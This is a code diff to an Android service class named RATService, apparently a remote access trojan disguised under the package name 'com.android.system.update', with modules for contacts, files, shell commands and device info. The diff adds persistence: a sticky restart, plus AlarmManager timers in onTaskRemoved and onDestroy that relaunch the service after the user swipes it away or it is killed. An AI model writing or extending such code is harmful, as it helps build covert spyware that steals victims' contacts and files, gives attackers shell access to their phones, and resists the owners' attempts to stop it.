@@ -1,12 +1,16 @@
 package com.android.system.update;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.SystemClock;
 import androidx.core.app.NotificationCompat;
 
 import com.android.system.update.modules.*;
@@ -35,7 +39,7 @@ public class RATService extends Service {
     private ContactsModule contactsModule;
     private FileModule fileModule;
     private ShellModule shellModule;
-    private DeviceModule deviceModule;  // ← ADD THIS LINE
+    private DeviceModule deviceModule;
     
     @Override
     public void onCreate() {
@@ -52,9 +56,15 @@ public class RATService extends Service {
         if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
         if (Config.ENABLE_FILES) fileModule = new FileModule(this);
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
-        deviceModule = new DeviceModule(this);  // ← ADD THIS LINE (always initialize)
+        deviceModule = new DeviceModule(this);
         
         startConnection();
+    }
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        // If service is killed, the system will try to restart it
+        return START_STICKY;
     }
     
     private void startConnection() {
@@ -183,7 +193,6 @@ public class RATService extends Service {
                 }
                 break;
                 
-            // ← ADD THIS NEW CASE
             case "DEVICE_INFO":
                 if (deviceModule != null) {
                     String result = deviceModule.getDeviceInfo();
@@ -225,6 +234,27 @@ public class RATService extends Service {
     }
     
     @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        
+        // Restart service when app is swiped away from recent tasks
+        Intent restartIntent = new Intent(this, RATService.class);
+        PendingIntent pendingIntent = PendingIntent.getService(
+            this, 1, restartIntent, 
+            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        if (alarmManager != null) {
+            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 
+                SystemClock.elapsedRealtime() + 1000, pendingIntent);
+        }
+        
+        // Stop the foreground service but the restart will bring it back
+        stopForeground(true);
+        stopSelf();
+    }
+    
+    @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
@@ -238,6 +268,19 @@ public class RATService extends Service {
         } catch (Exception e) {
             e.printStackTrace();
         }
+        
+        // Schedule restart if destroyed
+        Intent restartIntent = new Intent(this, RATService.class);
+        PendingIntent pendingIntent = PendingIntent.getService(
+            this, 2, restartIntent, 
+            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        if (alarmManager != null) {
+            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 
+                SystemClock.elapsedRealtime() + 2000, pendingIntent);
+        }
+        
         super.onDestroy();
     }
 }
